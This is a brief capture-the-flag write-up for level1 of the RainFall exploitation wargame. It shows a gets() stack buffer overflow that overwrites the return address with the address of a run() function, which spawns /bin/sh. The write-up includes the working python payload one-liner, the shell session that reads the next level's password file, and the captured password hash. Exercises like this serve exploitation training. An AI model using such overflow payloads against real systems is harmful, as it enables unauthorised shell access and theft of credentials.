# level1


the programe expect a 76 length char input using gets then return there is a function in the programe named run () at 08048444:

```bash
08048444    int32_t run()

0804846d        fwrite(buf: "Good... Wait what?\n", size: 1, count: 0x13, fp: stdout)
0804847f        return system(line: "/bin/sh")
```

it return system(line: "/bin/sh") we got to run it

\-> overflow fill the buffer + the run adress  and pass command that hand on the /bin/sh sense it return it :

```bash
level1@RainFall:~$ (python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1 
Good... Wait what?
cd ..
cd level2
cat .pas*       
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

here is the next level code :

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77